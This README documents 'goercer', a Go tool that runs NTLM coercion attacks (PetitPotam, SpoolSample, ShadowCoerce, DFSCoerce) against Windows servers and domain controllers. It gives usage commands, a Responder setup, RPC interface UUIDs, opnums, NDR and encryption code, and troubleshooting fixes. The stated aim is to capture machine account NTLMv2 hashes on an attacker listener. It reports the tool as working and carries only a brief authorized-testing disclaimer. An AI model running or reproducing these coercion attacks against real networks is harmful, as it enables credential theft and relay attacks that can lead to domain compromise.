# Goercer - NTLM Coercion Attack Tool

A Go implementation of NTLM coercion attacks using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing. Supports multiple coercion methods with extensible architecture.

## ✅ Status: **WORKING**

Successfully coerces Windows servers to authenticate to an attacker-controlled listener, capturing machine account NTLMv2 hashes.

**Supported Methods**:
- ✅ **PetitPotam** (MS-EFSRPC) - 1 callback - Works on ALL Windows servers
- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks - Works when Print Spooler is running
- ⚠️ **ShadowCoerce** (MS-FSRVP) - Requires VSS service configured for RPC
- ⚠️ **DFSCoerce** (MS-DFSNM) - Requires DFS Namespaces role installed

**Tested Against**: 
- Windows Server 2019 Domain Controller
- Windows Server 2016/2019/2022

**Result**: ✅ Machine account hashes captured via Responder

---

## Installation

```bash
git clone https://github.com/YOUR_USERNAME/goercer.git
cd goercer
./build.sh
```

The build script will automatically fetch the required `go-smb-coercer` fork with DCERPC pipe enhancements from https://github.com/ineffectivecoder/go-smb-coercer.

---

## Usage

```bash
./goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]

# Show help
./goercer -h
./goercer --help
```

### Help Output

```
Usage: goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]

Methods:
  petitpotam     - MS-EFSRPC coercion (default)
  spoolsample    - MS-RPRN print spooler coercion
  shadowcoerce   - MS-FSRVP volume shadow copy coercion
  dfscoerce      - MS-DFSNM DFS namespace coercion

Pipes (for petitpotam only):
  lsarpc (default), efsr, samr, netlogon, lsass

Examples:
  ./goercer <target> <listener> <user> <pass> <domain> petitpotam
  ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
  ./goercer <target> <listener> <user> <pass> <domain> spoolsample
```

### Quick Start

```bash
# Terminal 1: Start Responder
sudo responder -I eth0 -v

# Terminal 2: Run attacks

# PetitPotam with default pipe (lsarpc) - MOST RELIABLE
./goercer <target> <listener> <user> <pass> <domain> petitpotam

# PetitPotam with alternative pipe
./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr

# SpoolSample - HIGH SUCCESS RATE (3 callbacks)
./goercer <target> <listener> <user> <pass> <domain> spoolsample

# ShadowCoerce (only if VSS RPC is available)
./goercer <target> <listener> <user> <pass> <domain> shadowcoerce

# DFSCoerce (only if DFS Namespaces role installed)
./goercer <target> <listener> <user> <pass> <domain> dfscoerce
```

---

## Attack Methods

### PetitPotam (MS-EFSRPC) ✅ Most Reliable

- **Default Pipe**: `\pipe\lsarpc`
- **Alternative Pipes**: `\pipe\efsr`, `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass`
- **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0
- **Opnums**: 
  - 0 (EfsRpcOpenFileRaw - often patched)
  - 4 (EfsRpcEncryptFileSrv - working)
- **Callbacks**: 1 authentication attempt
- **Target Parameter**: UNC path in MS-EFSRPC function calls
- **Compatibility**: Works on **ALL Windows servers** (core service)
- **Discovery**: @topotam77

**Why it works**: LSARPC is a core Windows service present on every Windows system. The alternative pipes provide additional attack surface if lsarpc is somehow blocked.

### SpoolSample (MS-RPRN) ✅ High Success Rate

- **Pipe**: `\pipe\spoolss`
- **UUID**: `12345678-1234-abcd-ef00-0123456789ab` v1.0
- **Opnums**: 
  - 1 (RpcOpenPrinter - opens printer handle)
  - 65 (RpcRemoteFindFirstPrinterChangeNotificationEx)
  - 62 (RpcRemoteFindFirstPrinterChangeNotification)
- **Callbacks**: **3 authentication attempts** (maximum coercion!)
- **Target Parameter**: `pszLocalMachine` in notification functions
- **Compatibility**: Works when Print Spooler service is running (**default on most servers**)
- **Discovery**: @tifkin_ & @elad_shamir

**Why 3 callbacks**: Windows makes separate authentication attempts when opening the printer handle and when each notification function tries to contact the remote machine.

### ShadowCoerce (MS-FSRVP) ⚠️ Situational

- **Pipe**: `\pipe\FssagentRpc`
- **UUID**: `a8e0653c-2744-4389-a61d-7373df8b2292` v1.0
- **Opnums**: 
  - 8 (IsPathSupported)
  - 9 (IsPathShadowed)
- **Callbacks**: Varies
- **Target Parameter**: ShareName in VSS function calls
- **Compatibility**: Requires **Volume Shadow Copy Service (VSS) configured for RPC access**
- **Limitation**: Only works when VSS is properly configured - **not default on most servers**

**Common failure**: `failed to open pipe FssagentRpc: Requested file does not exist`

### DFSCoerce (MS-DFSNM) ⚠️ Requires DFS Role

- **Pipe**: `\pipe\netdfs`
- **UUID**: `4fc742e0-4a10-11cf-8273-00aa004ae673` v3.0
- **Opnums**: 
  - 12 (NetrDfsAddStdRoot)
  - 13 (NetrDfsRemoveStdRoot)
- **Callbacks**: Varies
- **Target Parameter**: ServerName in DFS function calls
- **Compatibility**: Only works when **DFS Namespaces role is installed AND configured**
- **Limitation**: **Rare** - most servers don't have DFS Namespaces configured
- **Discovery**: @filip_dragovic

**Common failures**: 
- `failed to open pipe netdfs: Requested file does not exist` - DFS not installed
- `bind rejected (BindNak)` - DFS exists but doesn't accept authenticated RPC

**Recommendation**: Use **PetitPotam** or **SpoolSample** for maximum compatibility. ShadowCoerce and DFSCoerce are situational and depend on optional Windows features.

---

## Technical Implementation

### Extensible Architecture

The codebase uses a `CoercionMethod` struct pattern for easy addition of new methods:

```go
type CoercionMethod struct {
    Name         string
    PipeName     string
    UUID         string
    MajorVersion uint16
    MinorVersion uint16
    Opnums       []uint16
    CreateStub   func(string, []byte) []byte
}
```

**Adding new methods** requires:
1. Define new CoercionMethod with pipe, UUID, opnums
2. Implement stub builder function with proper NDR encoding
3. Create execute function following PetitPotam/SpoolSample pattern
4. Add switch case in main()

### Implementation Flow

1. **SMB Connection** (`github.com/jfjallid/go-smb/smb`)
   - Connect to `\\target\IPC$`
   - NTLM authentication at SMB layer
   - Open named pipe based on method

2. **DCERPC Bind**
   - Method-specific UUID and version
   - Authentication: NTLM with PKT_PRIVACY (level 6)
   - 3-way handshake: Bind → BindAck → Auth3

3. **NTLM Authentication**
   - **Type 1 (Negotiate)**: Send with NTLMv2-required flags
   - **Type 2 (Challenge)**: Receive from server, extract targetInfo
   - **Type 3 (Authenticate)**: Build NTLMv2 response with:
     - NTLMv2 hash: `HMAC-MD5(NT hash, uppercase(user) + domain)`
     - Client challenge (8 random bytes)
     - Timestamp (Windows FILETIME format)
     - targetInfo from Challenge + TARGET_NAME AV_PAIR
     - MIC (Message Integrity Check)

4. **DCERPC Encryption (PKT_PRIVACY)**
   - Session key derivation with KEY_EXCH
   - Client keys: `MD5(sessionKey + "...client-to-server...magic constant\x00")`
   - Server keys: `MD5(sessionKey + "...server-to-client...magic constant\x00")`
   - **Critical**: RC4 cipher is continuous stream (never reset between messages)
   - **Encryption order**: Encrypt stub FIRST, then sign (signature encrypts checksum)
   - **Response decryption**: Extract encrypted stub, decrypt with server RC4 handle

5. **Coercion Execution**
   - Call RPC functions with listener UNC paths
   - Server attempts to access UNC path, triggering NTLM authentication
   - Responder captures machine account NTLMv2 hash

### Why PKT_PRIVACY (Level 6)?

Most coercion implementations use unauthenticated DCERPC. This implementation uses **PKT_PRIVACY** for:

- Understanding full DCERPC authentication mechanics
- Learning NTLM encryption/signing implementation
- Demonstrating encryption doesn't prevent coercion
- Bypassing potential security products that block unauthenticated RPC
- Educational value for penetration testers

### Critical NDR Encoding: SpoolSample

SpoolSample required solving **NDR (Network Data Representation) encoding** for RpcOpenPrinter:

**The Problem**: `pPrinterName` is `STRING_HANDLE` which equals `LPWSTR` (unique pointer in NDR).

**NDR Rule**: All unique pointers require a 4-byte **referent ID** before the pointed-to data.

**The Fix**:
```go
// Correct - referent ID first
binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID
binary.Write(&buf, binary.LittleEndian, lenChars)  // Then conformant varying string
```

Without the referent ID: `ERROR_BAD_NETPATH (0x6f7)`  
With the referent ID: Success, returns 20-byte `PRINTER_HANDLE`

### Response Decryption (PKT_PRIVACY)

Server responses in PKT_PRIVACY mode are encrypted and require decryption:

```go
// Server keys calculated with mode='Server'
auth.serverSignKey = calculateSignKey(exportedSessionKey, false)
auth.serverSealKey = calculateSealKey(exportedSessionKey, false)
auth.serverSealHandle, _ = rc4.NewCipher(auth.serverSealKey)

// Decryption process
authTrailerStart := fragLen - authLen - 8
encryptedStub := response[24:authTrailerStart] // Between header and trailer
auth.serverSealHandle.XORKeyStream(decryptedStub, encryptedStub)
```

**Structure**: DCERPC header (24) + encrypted stub + padding + auth trailer (8 + authLen)

**Note**: Fault responses have `authLen=0` (unencrypted)

---

## Common Errors and Solutions

### PetitPotam Errors

1. **ACCESS_DENIED (0x00000005)**
   - **Cause**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` or `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` in Type 1
   - **Fix**: Ensure both flags are set in Negotiate message

2. **Encryption mismatch / Decryption failures**
   - **Cause**: RC4 cipher being reset between requests
   - **Fix**: Use single continuous RC4 cipher handle

3. **Wrong pipe/UUID**
   - **Cause**: Using `\pipe\efsrpc` with wrong UUID
   - **Fix**: Use `\pipe\lsarpc` with `c681d488-d850-11d0-8c52-00c04fd90f7e`

### SpoolSample Errors

4. **ERROR_BAD_NETPATH in RpcOpenPrinter (0x6f7)**
   - **Cause**: Missing NDR referent ID for unique pointer
   - **Fix**: Add `0x00020000` referent ID before `pPrinterName` string

### ShadowCoerce Errors

5. **Pipe FssagentRpc not found**
   - **Cause**: VSS service not configured for RPC access
   - **Status**: Normal - VSS RPC is not enabled by default
   - **Solution**: Use PetitPotam or SpoolSample instead

### DFSCoerce Errors

6. **Pipe netdfs not found**
   - **Cause**: DFS Namespaces role not installed
   - **Status**: Normal - DFS Namespaces is optional
   - **Solution**: Use PetitPotam or SpoolSample instead

7. **Bind rejected (BindNak)**
   - **Cause**: DFS exists but doesn't accept PKT_PRIVACY authentication
   - **Status**: Some DFS versions don't support authenticated RPC
   - **Solution**: Use PetitPotam or SpoolSample instead

---

## Testing

### Basic Test Flow

```bash
# Terminal 1: Responder
sudo responder -I eth0 -v

# Terminal 2: Build
./build.sh

# Test PetitPotam (works on all servers)
./goercer <target> <listener> <user> <pass> <domain> petitpotam
# Expected: 1 callback in Responder

# Test PetitPotam with alternative pipe
./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
# Expected: 1 callback in Responder

# Test SpoolSample (works when Print Spooler running)
./goercer <target> <listener> <user> <pass> <domain> spoolsample
# Expected: 3 callbacks in Responder

# Test ShadowCoerce (only if VSS configured)
./goercer <target> <listener> <user> <pass> <domain> shadowcoerce
# Expected: Callback if VSS available, otherwise pipe not found error

# Test DFSCoerce (only if DFS Namespaces role installed)
./goercer <target> <listener> <user> <pass> <domain> dfscoerce
# Expected: Callback if DFS configured, otherwise pipe not found or bind rejected
```

### Expected Responder Output

```
[SMB] NTLMv2-SSP Client   : <target_ip>
[SMB] NTLMv2-SSP Username : <domain>\MACHINE$
[SMB] NTLMv2-SSP Hash     : MACHINE$::<domain>:<challenge>:<hash>:...
```

### Verify with Coercer

```bash
cd Coercer

# Test PetitPotam
./Coercer.py coerce -t <target> -d <domain> -u <user> -l <listener> --filter-pipe-name lsarpc

# Test SpoolSample
./Coercer.py coerce -t <target> -d <domain> -u <user> -l <listener> --filter-pipe-name spoolss

# Should get same callback counts as goercer
```

---

## Complete Working Solution Summary

After extensive debugging and analysis comparing with Python impacket and Coercer, the following critical fixes were required:

### Critical Fixes

1. **Type 1 Flags** ⚠️ MOST CRITICAL (PetitPotam)
   - **Problem**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` (0x00800000) and `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` (0x00080000)
   - **Impact**: Windows rejected authentication with ACCESS_DENIED before attempting coercion
   - **Fix**: Add both flags to Type 1 Negotiate message
   - **Lesson**: These flags signal NTLMv2 intent to server - without them, server rejects at NTLM layer

2. **Pipe and UUID** (PetitPotam)
   - **Problem**: Using `\pipe\efsrpc` with UUID `df1941c5-fe89-4e79-bf10-463657acf44d`
   - **Impact**: Wrong interface binding
   - **Fix**: Use `\pipe\lsarpc` with UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`
   - **Lesson**: Python PetitPotam uses lsarpc despite calling MS-EFSRPC functions

3. **NTLMv2 Identity Calculation**
   - **Problem**: Uppercasing both username AND domain: `uppercase(user + domain)`
   - **Impact**: Wrong NTLMv2 hash, authentication failure
   - **Fix**: Only uppercase username: `uppercase(user) + domain`
   - **Lesson**: MS-NLMP spec and impacket only uppercase the user component

4. **RC4 Cipher Continuity**
   - **Problem**: Creating new RC4 cipher for each request
   - **Impact**: Encryption keystream out of sync, decryption failures
   - **Fix**: Initialize RC4 once, reuse same cipher handle for all operations
   - **Lesson**: RC4 is a stream cipher - state must persist across all encryptions

5. **Encryption Order**
   - **Problem**: Signing before encrypting, or encrypting then signing separately
   - **Impact**: RC4 keystream bytes consumed in wrong order
   - **Fix**: Encrypt stub first, THEN sign (signature encrypts checksum with continued stream)
   - **Lesson**: impacket's SEAL function shows exact order - stub uses bytes 0..N, checksum uses N+1..N+8

6. **NDR Referent ID** ⚠️ CRITICAL FOR SPOOLSAMPLE
   - **Problem**: Missing 4-byte referent ID for unique pointer in RpcOpenPrinter
   - **Impact**: ERROR_BAD_NETPATH (0x6f7), RpcOpenPrinter failed
   - **Fix**: Add referent ID `0x00020000` before `pPrinterName` string
   - **Lesson**: `STRING_HANDLE = LPWSTR = unique pointer` in NDR requires referent ID before data

7. **Server-Side Crypto Keys** (Response Decryption)
   - **Problem**: Only had client keys, couldn't decrypt server responses
   - **Impact**: Could send encrypted requests but not decrypt responses
   - **Fix**: Calculate server keys with `mode='Server'` (false parameter), add serverSealHandle
   - **Lesson**: PKT_PRIVACY requires both directions - client keys for requests, server keys for responses

---

## Dependencies: go-smb-coercer

This project uses a customized fork of the go-smb library with specialized DCERPC/named pipe enhancements.

### What is go-smb-coercer?

**GitHub Repository**: https://github.com/ineffectivecoder/go-smb-coercer

This fork contains v0.6.7 of `github.com/jfjallid/go-smb` with **5 additional methods** for DCERPC named pipe communication. The fork extends the upstream library with specialized enhancements for coercion attacks.

### Why it exists

The upstream go-smb library focuses on high-level SMB file operations and lacks low-level named pipe primitives needed for DCERPC. This implementation requires fine-grained control over:

- Message-oriented pipe operations (named pipes use offset=0, not file positions)
- Fire-and-forget writes (Auth3 packets don't expect responses)
- Pipe-specific error handling (EOF, broken pipe, disconnected states)

### Modifications (5 new methods added to upstream)

**In `smb/connection.go`:**

- `sendNoWait()` - Fire-and-forget send operation. Waits for SMB ack but doesn't return DCERPC response. Used for Auth3 packets (2-second timeout).

**In `smb/session.go` (on File struct):**

- `WritePipe(data)` - Write to named pipe with SMB Write Response handling. Always uses offset=0 (pipes are message-oriented).
- `ReadPipe(b)` - Read from named pipe with pipe-specific error handling. Handles EOF, broken pipe, and disconnected states.
- `WriteFileNoRecv(data, offset)` - Write without waiting for response. Also fire-and-forget for Auth3.

**In `smb/session.go` (on Connection struct):**

- `WriteIoCtlReqNoWait(req)` - IOCTL request without response. Wrapper around `sendNoWait()`.

### Code Layout

**go-smb-coercer** (GitHub fork):
```
smb/
├── connection.go          (+ sendNoWait method)
├── session.go             (+ WritePipe, ReadPipe, WriteFileNoRecv, WriteIoCtlReqNoWait)
└── dcerpc/                (unchanged - library's DCERPC functions)
```

**goercer** (main project):
```
goercer_full.go            Main implementation with all coercion methods
build.sh                   Build script
go.mod                     Module with replace directive for go-smb-coercer fork
README.md                  This file
```

### Usage in goercer

The main code uses `WritePipe()` and `ReadPipe()` throughout for DCERPC communication. Without these methods, the code would need to use low-level IOCTL calls directly, making it significantly more verbose and less maintainable.

---

## References

- **MS-EFSR**: Encrypting File System Remote (EFSRPC) Protocol
- **MS-RPRN**: Print System Remote Protocol
- **MS-FSRVP**: File Server Remote VSS Protocol
- **MS-DFSNM**: Distributed File System (DFS): Namespace Management Protocol
- **MS-RPCE**: Remote Procedure Call Protocol Extensions  
- **MS-NLMP**: NT LAN Manager (NTLM) Authentication Protocol
- **PetitPotam**: Original PoC by @topotam77
- **SpoolSample/PrinterBug**: @tifkin_ & @elad_shamir
- **ShadowCoerce**: Volume Shadow Copy coercion
- **DFSCoerce**: DFS namespace coercion by @filip_dragovic
- **impacket**: Python implementation reference
- **Coercer**: Multi-method coercion tool by @p0dalirius

---

## Credits

- **@topotam77**: Original PetitPotam discovery and PoC
- **@p0dalirius**: Coercer multi-method implementation and validation
- **Lee Christensen (@tifkin_)**: SpoolSample/PrinterBug discovery
- **@elad_shamir**: SpoolSample research
- **@filip_dragovic**: DFSCoerce discovery
- **impacket team**: Reference NTLM/DCERPC implementation
- **go-smb** (jfjallid): Go SMB client library [go-smb](https://github.com/jfjallid/go-smb)
- **Microsoft**: Protocol specifications

---

## License

This tool is for educational and authorized testing purposes only. Ensure you have explicit permission before testing against any systems.
